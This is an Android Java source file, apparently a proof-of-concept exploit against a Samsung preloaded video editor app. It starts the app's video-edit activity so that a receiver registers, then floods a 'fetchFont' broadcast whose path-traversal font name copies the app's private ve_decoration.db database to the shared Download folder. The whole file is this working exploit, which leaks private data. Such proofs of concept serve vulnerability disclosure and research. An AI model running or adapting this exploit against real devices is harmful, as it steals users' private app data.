package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import java.util.ArrayList;
import java.util.Arrays;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // launch the activity to register the receiver automatically
        Uri videoUri = Uri.parse("content://poc.provider.video/?name=video.mp4");
        Intent i = new Intent();
        i.setClassName("com.sec.android.app.vepreload", "com.sec.android.app.vepreload.singleedit.activity.SimpleVideoEditActivity");
        i.putExtra(Intent.EXTRA_STREAM, new ArrayList<>(Arrays.asList(videoUri)));
        startActivity(i);

        // attack the receiver
        Intent broadcastIntent = new Intent("com.sec.android.app.vepreload.fetchFont");
        broadcastIntent.putExtra("uri", "file:///data/user/0/com.sec.android.app.vepreload/databases/ve_decoration.db");
        broadcastIntent.putExtra("font_name", "../../../../../sdcard/Download/leak");
        broadcastIntent.putExtra("status", 1);
        new Thread(() -> {
            while (true) {
                sendBroadcast(broadcastIntent);
                try {
                    Thread.sleep(100);
                } catch (Throwable th) {
                    throw new RuntimeException(th);
                }
            }
        }).start();
    }
}